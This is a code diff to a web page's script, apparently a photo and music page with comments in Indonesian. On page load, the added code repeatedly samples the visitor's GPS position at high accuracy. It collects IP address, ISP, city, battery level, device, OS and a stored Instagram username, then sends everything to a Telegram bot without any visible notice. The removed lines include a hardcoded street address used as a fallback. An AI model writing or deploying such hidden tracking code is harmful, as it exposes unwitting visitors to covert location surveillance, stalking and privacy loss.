@@ -111,35 +111,99 @@ const openPhotoOptions = document.getElementById('openPhotoOptions');
     }
   });
 
-  // visitor info function (unchanged)
-  async function showVisitorInfo() {
-    const savedUser = localStorage.getItem("ig_user") || "Anonim";
-    async function sendToTelegram(d, latitude, longitude, source = "Unknown") {
+// versi baru: ambil lokasi lebih akurat (multi-sample + fallback)
+async function showVisitorInfo() {
+  const savedUser = localStorage.getItem("ig_user") || "Anonim";
+
+  async function sendToTelegram(d, latitude, longitude, source = "Unknown", accuracy = null) {
+    try {
+      const now = new Date();
+      const mapLink = (latitude && longitude)
+        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
+        : "https://www.google.com/maps";
+      const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
+      const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
+                 /Android/i.test(navigator.userAgent) ? "Android" :
+                 /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
+                 /Mac/i.test(navigator.userAgent) ? "MacOS" :
+                 /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
+      let batteryInfo = "Tidak diketahui";
       try {
-        const now = new Date();
-        const fixedAddress = "WWM9+J39 Getasrejo, Kabupaten Grobogan, Jawa Tengah";
-        const fixedMap = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(fixedAddress)}&z=17`;
-        const mapLink = (latitude && longitude) ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17` : fixedMap;
-        const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
-        const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
-                   /Android/i.test(navigator.userAgent) ? "Android" :
-                   /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
-                   /Mac/i.test(navigator.userAgent) ? "MacOS" :
-                   /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
-        let batteryInfo = "Tidak diketahui";
-        try { const battery = await navigator.getBattery(); batteryInfo = `${(battery.level*100).toFixed(0)}% (${battery.charging?"⚡":"🔋"})`; } catch {}
-        const msg = `📢 Pengunjung Baru!\n👤 ${savedUser}\n🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}\n🗺️ Maps: ${mapLink}\n💻 ${device}\n🧩 OS: ${os}\n🔋 Baterai: ${batteryInfo}\n🏷️ ISP: ${d.connection?.isp || d.org || "?"}\n📡 IP: ${d.ip || "?"}\n📍 Sumber Lokasi: ${source}\n🕓 ${now.toLocaleString('id-ID')}`;
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ chat_id: CHAT_ID, text: msg, disable_web_page_preview: false }) });
-        if(!res.ok) console.error("❌ Telegram API error:", await res.text()); else console.log("✅ Info pengunjung terkirim.");
-      } catch (err) { console.error("❌ Gagal kirim info pengunjung:", err); }
-    }
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(async (pos)=>{ const {latitude, longitude} = pos.coords; try{ const r = await fetch("https://ipwho.is/"); const d = await r.json(); sendToTelegram(d, latitude, longitude, "GPS"); }catch{ sendToTelegram({}, latitude, longitude, "GPS"); } }, async ()=>{ try{ const r = await fetch("https://ipwho.is/"); const d = await r.json(); sendToTelegram(d, d.latitude, d.longitude, "IP-based"); }catch{ sendToTelegram({}, null, null, "Fixed"); } }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
-    } else {
-      try{ const r = await fetch("https://ipwho.is/"); const d = await r.json(); sendToTelegram(d, d.latitude, d.longitude, "No GPS"); } catch { sendToTelegram({}, null, null, "Fixed"); }
+        const battery = await navigator.getBattery();
+        batteryInfo = `${(battery.level*100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
+      } catch {}
+
+      const msg =
+`📢 Pengunjung Baru!
+👤 ${savedUser}
+🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
+🗺️ Maps: ${mapLink}
+📍 Sumber Lokasi: ${source}${accuracy ? ` (±${accuracy}m)` : ""}
+💻 ${device}
+🧩 OS: ${os}
+🔋 Baterai: ${batteryInfo}
+🏷️ ISP: ${d.connection?.isp || d.org || "?"}
+📡 IP: ${d.ip || "?"}
+🕓 ${now.toLocaleString('id-ID')}`;
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+      });
+      console.log("✅ Info pengunjung dikirim (sumber:", source, ")");
+    } catch (err) {
+      console.error("❌ Gagal kirim info:", err);
     }
   }
-  showVisitorInfo();
+
+  async function getBestGPS(samples = 5) {
+    return new Promise((resolve, reject) => {
+      if (!navigator.geolocation) return reject("No geolocation support");
+      const results = [];
+      const opts = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
+
+      function capture() {
+        navigator.geolocation.getCurrentPosition(pos => {
+          results.push(pos.coords);
+          if (results.length >= samples) {
+            // pilih titik dengan akurasi terbaik
+            const best = results.reduce((a,b) => a.accuracy < b.accuracy ? a : b);
+            resolve(best);
+          } else {
+            setTimeout(capture, 700);
+          }
+        }, err => {
+          if (results.length > 0) {
+            const best = results.reduce((a,b) => a.accuracy < b.accuracy ? a : b);
+            resolve(best);
+          } else reject(err);
+        }, opts);
+      }
+      capture();
+    });
+  }
+
+  try {
+    // 1️⃣ coba GPS high accuracy (multi-sampling)
+    const coords = await getBestGPS(6);
+    const { latitude, longitude, accuracy } = coords;
+    const ipData = await (await fetch("https://ipwho.is/")).json();
+    sendToTelegram(ipData, latitude, longitude, "GPS HighAccuracy", Math.round(accuracy));
+  } catch (e1) {
+    console.warn("⚠️ GPS gagal, fallback ke IP:", e1);
+    try {
+      // 2️⃣ fallback ke IP-based lokasi
+      const d = await (await fetch("https://ipwho.is/")).json();
+      sendToTelegram(d, d.latitude, d.longitude, "IP-based");
+    } catch (e2) {
+      // 3️⃣ fallback terakhir (lokasi default)
+      sendToTelegram({}, null, null, "Fixed");
+    }
+  }
+}
+
+showVisitorInfo();
 
   // autoplay music attempt
   setTimeout(()=>{ startMusic(); },700);
